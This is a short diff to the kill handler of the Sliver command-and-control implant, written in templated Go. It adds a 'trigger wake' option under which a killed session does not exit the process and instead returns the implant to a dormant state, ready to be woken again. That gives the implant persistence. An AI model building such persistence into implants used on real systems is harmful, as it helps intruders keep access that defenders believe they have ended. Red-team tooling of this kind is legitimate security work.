@@ -21,8 +21,10 @@ package handlers
 */
 
 import (
+	// {{if not .Config.IncludeTriggerWake}}
 	"os"
 	"time"
+	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -52,6 +54,17 @@ func killHandler(data []byte, _ *transports.Connection) error {
 	if err != nil {
 		return err
 	}
+	// {{if .Config.IncludeTriggerWake}}
+	// Trigger implants: do NOT os.Exit. The kill handler's presence in
+	// specialHandlers causes sessionMainLoop to return ErrTerminate,
+	// which makes sessionStartup return cleanly. The trigger loop in
+	// runner.Main then goes back to the dormant wake-wait state, ready
+	// to be woken again. Calling os.Exit would kill the entire process
+	// and defeat the purpose of a persistent trigger implant.
+	// {{if .Config.Debug}}
+	log.Println("[triggerwake] session kill -- returning to dormant state (no os.Exit)")
+	// {{end}}
+	// {{else}}
 	// {{if .Config.Debug}}
 	log.Println("Let's exit!")
 	// {{end}}
@@ -59,5 +72,6 @@ func killHandler(data []byte, _ *transports.Connection) error {
 		time.Sleep(time.Second)
 		os.Exit(0)
 	}()
+	// {{end}}
 	return nil
 }
